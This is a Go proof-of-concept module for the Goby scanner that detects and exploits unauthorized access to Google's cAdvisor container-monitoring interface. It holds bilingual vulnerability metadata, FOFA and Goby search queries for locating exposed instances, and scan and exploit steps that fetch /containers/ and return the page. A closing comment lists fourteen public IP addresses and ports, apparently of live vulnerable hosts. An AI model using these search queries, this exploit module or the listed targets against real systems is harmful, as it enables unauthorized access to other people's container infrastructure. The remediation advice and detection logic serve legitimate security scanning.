package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "cAdvisor Unauthorized Access Vulnerability",
    "Description": "<p>Cadvisor is a container monitoring tool developed by Google, which is embedded into k8s as a monitoring component of k8s. The cAdvisor container monitoring system can monitor resources and containers on node machines in real time and collect performance data, including CPU usage, memory usage, network throughput and file system usage</p><p>There is an unauthorized access vulnerability in the cAdvisor interface. If the attacker has not obtained the login permission or is not authorized, he can directly enter the main page address of the website console to gain access.</p>",
    "Product": "Google-Cadvisor-CMT",
    "Homepage": "https://github.com/google/cadvisor/",
    "DisclosureDate": "2019-09-26",
    "Author": "pspongebob@sina.com",
    "FofaQuery": "body=\"<h4><a href=\\\"../docker\\\">Docker Containers</a></h4>\" || body=\"href=\\\"/containers/\\\">Temporary Redirect\"",
    "GobyQuery": "body=\"<h4><a href=\\\"../docker\\\">Docker Containers</a></h4>\" || body=\"href=\\\"/containers/\\\">Temporary Redirect\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized access vulnerability in the cAdvisor interface. If the attacker has not obtained the login permission or is not authorized, he can directly enter the main page address of the website console to gain access.</p>",
    "Recommendation": "<p>The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://github.com/google/cadvisor/\">https://github.com/google/cadvisor/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/containers/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "cAdvisor - /",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Isolation",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/containers/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "cAdvisor - /",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Isolation",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "cAdvisor 未授权访问漏洞",
            "Product": "Google-cAdvisor容器监控工具",
            "Description": "<p>cadvisor是一个谷歌开发的容器监控工具,它被内嵌到k8s中作为k8s的监控组件。cAdvisor容器监控系统，可以对节点机器上的资源及容器进行实时监控和性能数据采集，包括CPU使用情况、内存使用情况、网络吞吐量及文件系统使用情况<br></p><p>cAdvisor界面存在未授权访问漏洞，在攻击者没有获取到登录权限或未授权的情况下，即可通过直接输入网站控制台主页面地址，便可进行访问。<br></p>",
            "Recommendation": "<p>官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/google/cadvisor/\">https://github.com/google/cadvisor/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>cAdvisor界面存在未授权访问漏洞，在攻击者没有获取到登录权限或未授权的情况下，即可通过直接输入网站控制台主页面地址，便可进行访问。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "cAdvisor Unauthorized Access Vulnerability",
            "Product": "Google-Cadvisor-CMT",
            "Description": "<p>Cadvisor is a container monitoring tool developed by Google, which is embedded into k8s as a monitoring component of k8s. The cAdvisor container monitoring system can monitor resources and containers on node machines in real time and collect performance data, including CPU usage, memory usage, network throughput and file system usage</p><p>There is an unauthorized access vulnerability in the cAdvisor interface. If the attacker has not obtained the login permission or is not authorized, he can directly enter the main page address of the website console to gain access.</p>",
            "Recommendation": "<p>The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://github.com/google/cadvisor/\" rel=\"nofollow\">https://github.com/google/cadvisor/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">There is an unauthorized access vulnerability in the cAdvisor interface. If the attacker has not obtained the login permission or is not authorized, he can directly enter the main page address of the website console to gain access.</span><br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9934"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

/*
http://123.174.188.187:18080
http://223.241.144.87:18080
http://112.111.109.11:18080
http://121.236.58.101:18080
http://39.101.170.31:9222
http://114.239.82.188:18080
http://115.199.174.105:18080
http://120.79.142.34:8090
http://117.81.220.13:18080
http://121.236.58.110:18080
http://121.226.212.9:18080
http://117.62.248.242:18080
http://112.65.150.131:18080
http://114.97.82.72:18080
*/
